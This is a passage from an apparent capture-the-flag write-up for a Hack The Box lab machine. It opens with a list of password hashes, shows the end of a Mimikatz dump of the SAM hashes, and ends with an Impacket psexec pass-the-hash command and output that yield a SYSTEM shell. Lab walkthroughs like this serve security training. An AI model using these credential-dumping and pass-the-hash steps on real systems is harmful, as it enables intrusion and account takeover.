    13  613839caf0cf709da25991e2e5cb63cf
    14  16974c015c9905fb27e55a52dc14dfb0
    15  3c8af7ccd5e9bd131849990d6f18954b
    16  2b26fb63dcbf03fe68b67cdd2c72b6e6
    17  6eeda5f64e4adef4c299717eafbd2850
    18  3b32ec94978feeac76ba92b312114e2c
    19  b25058bc1ebfcac10605d39f65bff67f
    20  89e75cc6957728117eb1192e739e5235
    21  7e6d891c956f186006f07f15719a8a4e
    22  a2cada693715ecc5725a235d3439e6a2
    23  79e1db34d98ccd050b493138a3591683
    24  1f29ace4f232ebce1a60a48a45593205
    25  9233c8df5a28ee96900cc8b59a731923
    26  08c02557056f293aab47eccf1186c100
    27  695caa49e68da1ae78c1523b3442e230
    28  57d7b68bd2f06eae3ba10ca342e62a78
    29  3f14bb208435674e6a1cb8a957478c18


mimikatz(commandline) # exit
Bye!
```
Mimikatz has successfully dumped the SAM file, with the hashed Administrator password to the sreen.

### 10. Access the admin account
With the hashes dumped, they can now be used to get a shell as system.
```sh
kali@kali:~/Desktop/htb/sauna$ /usr/share/doc/python3-impacket/examples/psexec.py -hashes ee8c50e6bc332970a8e8a632488f5211:d9485863c1e9e05851aa40cbb4ab9dff egotistical-bank.local/Administrator@10.10.10.175
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.175.....
[*] Found writable share ADMIN$
[*] Uploading file jvMLLShD.exe
[*] Opening SVCManager on 10.10.10.175.....
[*] Creating service LZGV on 10.10.10.175.....
[*] Starting service LZGV.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```
